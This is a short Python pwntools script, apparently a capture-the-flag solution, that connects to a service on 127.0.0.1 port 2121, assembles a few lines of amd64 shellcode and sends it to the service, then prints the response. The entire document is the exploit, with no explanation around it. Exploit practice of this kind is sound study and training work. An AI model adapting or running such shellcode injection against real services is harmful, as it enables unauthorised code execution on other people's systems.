from pwn import *

context.arch="amd64"

p = remote("127.0.0.1",2121)
sh = asm("call [rsp+40]; add rdi,20; mov rax, [rsp]; mov al,46; call rax")

p.sendline(sh)
print p.recv()

